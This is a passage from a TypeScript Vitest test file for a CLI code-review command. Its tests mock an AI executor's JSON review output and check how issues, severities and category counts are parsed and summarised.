      setupWorkspaceSpy.mockRestore();
    }
  });

  test('rejects --save-issues for branch target before workspace or executor allocation', async () => {
    const setupWorkspaceSpy = vi.spyOn(workspaceSetupModule, 'setupWorkspace');
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    try {
      await expect(
        handleReviewCommand(
          undefined,
          { branch: 'feature/some-branch', saveIssues: true },
          { parent: { opts: () => ({}) } }
        )
      ).rejects.toThrow('--save-issues requires a plan-backed review target.');

      expect(setupWorkspaceSpy).not.toHaveBeenCalled();
      expect(executorsModule.buildExecutorAndLog).not.toHaveBeenCalled();
      expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
    } finally {
      setupWorkspaceSpy.mockRestore();
    }
  });

  test('exits early without calling executor when current target has no changes', async () => {
    await createCommittedBaseline(testDir);
    const setupWorkspaceSpy = vi.spyOn(workspaceSetupModule, 'setupWorkspace');

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('feature/no-changes');

    try {
      await expect(
        handleReviewCommand(
          undefined,
          { current: true, noSave: true, noAutofix: true },
          { parent: { opts: () => ({}) } }
        )
      ).resolves.toEqual({ tasksAppended: 0, issuesSaved: 0 });

      expect(setupWorkspaceSpy).not.toHaveBeenCalled();
      expect(executorsModule.buildExecutorAndLog).not.toHaveBeenCalled();
      expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
    } finally {
      setupWorkspaceSpy.mockRestore();
    }
  });
});

describe('JSON output mode integration', () => {
  test('detects JSON output from executor metadata and parses correctly', async () => {
    await writePlanToDb(
      {
        id: 200,
        title: 'JSON Output Test Plan',
        goal: 'Test JSON output parsing',
        tasks: [{ title: 'Test task', description: 'A test task for JSON output' }],
      },
      { cwdForIdentity: testDir }
    );

    // JSON output that the executor would return with structured format
    const jsonReviewOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in user input',
          file: 'src/db.ts',
          line: '42',
          suggestion: 'Use parameterized queries',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'N+1 query in user listing',
          file: 'src/api.ts',
          line: '15',
          suggestion: 'Batch database queries',
        },
      ],
      recommendations: ['Add input validation'],
      actionItems: ['Fix SQL injection before release'],
    });

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        // Return an ExecutorOutput object with metadata.jsonOutput = true
        return {
          content: jsonReviewOutput,
          success: true,
          metadata: {
            jsonOutput: true,
          },
        };
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('abc123');

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '200',
        planData: {
          id: 200,
          title: 'JSON Output Test Plan',
          goal: 'Test JSON output parsing',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task for JSON output',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/db.ts', 'src/api.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command
    await handleReviewCommand(200, { noAutofix: true }, mockCommand);

    // Verify the executor was called
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      expect.any(String),
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('executor string output must be valid JSON', async () => {
    await writePlanToDb(
      {
        id: 201,
        title: 'Text Output Test Plan',
        goal: 'Test text output parsing',
        tasks: [{ title: 'Test task', description: 'A test task for text output' }],
      },
      { cwdForIdentity: testDir }
    );

    // JSON output that the executor would return in string format
    const jsonReviewOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in database queries',
          file: 'src/database.ts',
          line: '88',
          suggestion: 'Use parameterized queries',
        },
      ],
      recommendations: ['Use parameterized queries'],
      actionItems: [],
    });

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        // Return a plain JSON string (no ExecutorOutput wrapper)
        return jsonReviewOutput;
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('def456');

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '201',
        planData: {
          id: 201,
          title: 'Text Output Test Plan',
          goal: 'Test text output parsing',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task for text output',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/queries.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command - should not throw
    await handleReviewCommand(201, { noAutofix: true }, mockCommand);

    // Verify the executor was called
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('executor output with JSON content is parsed correctly', async () => {
    await writePlanToDb(
      {
        id: 202,
        title: 'Explicit Text Mode Plan',
        goal: 'Test explicit text mode',
        tasks: [{ title: 'Test task', description: 'A test task' }],
      },
      { cwdForIdentity: testDir }
    );

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'major',
          category: 'performance',
          content: 'Performance issue detected',
          file: 'src/perf.ts',
          line: '33',
          suggestion: 'Optimize the algorithm',
        },
      ],
      recommendations: [],
      actionItems: [],
    });

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        // Return an ExecutorOutput object with JSON content
        return {
          content: jsonOutput,
          success: true,
          metadata: {
            jsonOutput: true,
          },
        };
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('ghi789');

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '202',
        planData: {
          id: 202,
          title: 'Explicit Text Mode Plan',
          goal: 'Test explicit text mode',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command
    await handleReviewCommand(202, { noAutofix: true }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('summary statistics are correctly calculated from JSON-parsed issues', async () => {
    // This test verifies that when issues are parsed from JSON, the summary
    // statistics (criticalCount, majorCount, etc.) are correctly computed
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'Issue 1',
          file: 'src/test.ts',
          line: '1',
          suggestion: 'Fix 1',
        },
        {
          severity: 'critical',
          category: 'security',
          content: 'Issue 2',
          file: 'src/test.ts',
          line: '2',
          suggestion: 'Fix 2',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'Issue 3',
          file: 'src/test.ts',
          line: '3',
          suggestion: 'Fix 3',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Issue 4',
          file: 'src/test.ts',
          line: '4',
          suggestion: 'Fix 4',
        },
        {
          severity: 'info',
          category: 'other',
          content: 'Issue 5',
          file: 'src/test.ts',
          line: '5',
          suggestion: 'Fix 5',
        },
      ],
      recommendations: ['Rec 1', 'Rec 2'],
      actionItems: ['Action 1'],
    });

    const result = createReviewResult(
      'test-plan',
      'Test Plan',
      'main',
      ['file1.ts', 'file2.ts', 'file3.ts'],
      jsonOutput
    );

    // Verify summary statistics
    expect(result.summary.totalIssues).toBe(5);
    expect(result.summary.criticalCount).toBe(2);
    expect(result.summary.majorCount).toBe(1);
    expect(result.summary.minorCount).toBe(1);
    expect(result.summary.infoCount).toBe(1);
    expect(result.summary.filesReviewed).toBe(3);

    // Verify category counts
    expect(result.summary.categoryCounts.security).toBe(2);
    expect(result.summary.categoryCounts.performance).toBe(1);
    expect(result.summary.categoryCounts.style).toBe(1);
    expect(result.summary.categoryCounts.other).toBe(1);

    // Verify issues have auto-generated IDs
    expect(result.issues[0].id).toBe('issue-1');
    expect(result.issues[4].id).toBe('issue-5');

    // Verify recommendations and action items
    expect(result.recommendations).toEqual(['Rec 1', 'Rec 2']);
    expect(result.actionItems).toEqual(['Action 1']);
  });

  test('JSON parsing correctly extracts all issue fields including file, line, and suggestion', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in user input',
          file: 'src/db.ts',
          line: '42',
          suggestion: 'Use parameterized queries',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'N+1 query in user listing',
          file: 'src/api.ts',
          line: '15',
          suggestion: 'Use batch queries',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Inconsistent naming convention',
          file: 'src/utils.ts',
          line: '25-30',
          suggestion: 'Use consistent naming',
        },
      ],
      recommendations: ['Add input validation', 'Use prepared statements'],
      actionItems: ['Fix SQL injection before release', 'Add performance tests'],
    });

    const result = createReviewResult(
      'test-plan',
      'Test Plan',
      'main',
      ['src/db.ts', 'src/api.ts'],
      jsonOutput
    );

    // Verify first issue has all fields
    expect(result.issues[0]).toMatchObject({
      id: 'issue-1',
      severity: 'critical',
      category: 'security',
      content: 'SQL injection vulnerability in user input',
      file: 'src/db.ts',
      line: '42',
      suggestion: 'Use parameterized queries',
    });

    // Verify second issue has all fields
    expect(result.issues[1]).toMatchObject({
      id: 'issue-2',
      severity: 'major',
      category: 'performance',
      content: 'N+1 query in user listing',
      file: 'src/api.ts',
      line: '15',
      suggestion: 'Use batch queries',
    });

    // Verify third issue has all fields
    expect(result.issues[2]).toMatchObject({
      id: 'issue-3',
      severity: 'minor',
      category: 'style',
      content: 'Inconsistent naming convention',
      file: 'src/utils.ts',
      line: '25-30',
      suggestion: 'Use consistent naming',
    });

    // Verify recommendations and action items arrays
    expect(result.recommendations).toEqual(['Add input validation', 'Use prepared statements']);
    expect(result.actionItems).toEqual([
      'Fix SQL injection before release',
      'Add performance tests',
    ]);
  });

  test('JSON parsing handles empty arrays correctly', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [],
      recommendations: [],
      actionItems: [],
    });

    const result = createReviewResult('test-plan', 'Test Plan', 'main', ['file.ts'], jsonOutput);

    expect(result.issues).toEqual([]);
    expect(result.recommendations).toEqual([]);
    expect(result.actionItems).toEqual([]);
    expect(result.summary.totalIssues).toBe(0);
    expect(result.summary.criticalCount).toBe(0);
    expect(result.summary.majorCount).toBe(0);
    expect(result.summary.minorCount).toBe(0);
    expect(result.summary.infoCount).toBe(0);
  });

  test('JSON parsing extracts all category types correctly', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'Security issue',
          file: 'src/test.ts',
          line: '1',
          suggestion: 'Fix security',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'Performance issue',
          file: 'src/test.ts',
          line: '2',
          suggestion: 'Fix performance',
        },
        {
          severity: 'major',
          category: 'bug',
          content: 'Bug issue',
          file: 'src/test.ts',
          line: '3',
          suggestion: 'Fix bug',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Style issue',
          file: 'src/test.ts',
          line: '4',
          suggestion: 'Fix style',
        },
        {
          severity: 'minor',
          category: 'compliance',
          content: 'Compliance issue',
          file: 'src/test.ts',
          line: '5',
          suggestion: 'Fix compliance',
        },
        {
          severity: 'info',
          category: 'testing',
          content: 'Testing issue',
          file: 'src/test.ts',
          line: '6',
          suggestion: 'Fix testing',
        },
        {
          severity: 'info',
          category: 'other',
          content: 'Other issue',
          file: 'src/test.ts',
          line: '7',
          suggestion: 'Fix other',
        },
      ],
      recommendations: [],
      actionItems: [],
    });

    const result = createReviewResult('test-plan', 'Test Plan', 'main', [], jsonOutput);

    // Verify all category counts
    expect(result.summary.categoryCounts.security).toBe(1);
    expect(result.summary.categoryCounts.performance).toBe(1);
    expect(result.summary.categoryCounts.bug).toBe(1);
    expect(result.summary.categoryCounts.style).toBe(1);
    expect(result.summary.categoryCounts.compliance).toBe(1);
    expect(result.summary.categoryCounts.testing).toBe(1);
    expect(result.summary.categoryCounts.other).toBe(1);

    // Verify severity counts
    expect(result.summary.criticalCount).toBe(1);
    expect(result.summary.majorCount).toBe(2);
    expect(result.summary.minorCount).toBe(2);
    expect(result.summary.infoCount).toBe(2);
    expect(result.summary.totalIssues).toBe(7);
  });
});
